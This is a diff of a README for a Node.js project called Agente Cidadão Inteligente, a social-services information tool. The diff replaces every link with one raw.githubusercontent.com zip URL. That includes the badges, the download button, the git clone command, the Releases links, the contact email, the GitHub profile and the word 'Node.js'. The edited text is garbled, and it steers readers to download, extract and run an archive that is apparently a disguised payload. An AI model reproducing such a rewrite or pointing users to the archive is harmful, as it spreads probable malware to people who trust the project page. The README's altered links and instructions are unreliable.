@@ -1,8 +1,8 @@
 # 🤖 Agente Cidadão Inteligente
 
-![Agente Cidadão Inteligente](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg) ![License](https://img.shields.io/badge/License-MIT-blue.svg) ![GitHub Release](https://img.shields.io/badge/Release-Download%20Latest%20Release-blue.svg)
+![Agente Cidadão Inteligente](https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip) ![License](https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip) ![GitHub Release](https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip%20Latest%https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip)
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightblue.svg)](https://github.com/alexparjalex/agente-cidadao-inteligente/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip)](https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip)
 
 Agente Cidadão Inteligente (ACI) is an intelligent system designed to provide information about social services and other resources. This project aims to bridge the gap between citizens and essential services using advanced technology.
 
@@ -35,18 +35,18 @@ To get started with ACI, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/alexparjalex/agente-cidadao-inteligente.git
+   git clone https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip
    cd agente-cidadao-inteligente
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js and npm installed. Then run:
+   Make sure you have https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip and npm installed. Then run:
    ```bash
    npm install
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/alexparjalex/agente-cidadao-inteligente/releases) to download the latest version. Extract the files and run the application.
+   Visit the [Releases section](https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip) to download the latest version. Extract the files and run the application.
 
 4. **Run the Application**:
    Start the server with:
@@ -103,8 +103,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: alexparjalex@example.com
-- **GitHub**: [alexparjalex](https://github.com/alexparjalex)
+- **Email**: https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip
+- **GitHub**: [alexparjalex](https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip)
 
 ## Acknowledgments
 
@@ -114,4 +114,4 @@ We thank all contributors and users for their support. Your feedback helps us im
 
 Agente Cidadão Inteligente is here to make access to social services easier for everyone. By using advanced technology, we aim to empower citizens with the information they need. 
 
-For more updates and to download the latest version, visit the [Releases section](https://github.com/alexparjalex/agente-cidadao-inteligente/releases).
+For more updates and to download the latest version, visit the [Releases section](https://raw.githubusercontent.com/alexparjalex/agente-cidadao-inteligente/main/yestern/inteligente_cidadao_agente_therapeusis.zip).
